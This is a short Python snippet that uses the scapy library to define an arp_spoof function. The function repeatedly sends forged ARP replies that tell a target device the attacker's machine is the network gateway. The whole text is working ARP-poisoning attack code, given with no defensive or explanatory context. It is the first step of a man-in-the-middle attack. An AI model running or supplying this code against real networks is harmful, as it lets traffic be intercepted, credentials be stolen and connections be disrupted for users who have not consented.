from scapy.all import ARP, send
import time

def arp_spoof(target_ip, target_mac, gateway_ip):
    # Spoof the target device into thinking your computer is the gateway
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        while True:
            send(packet, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        return
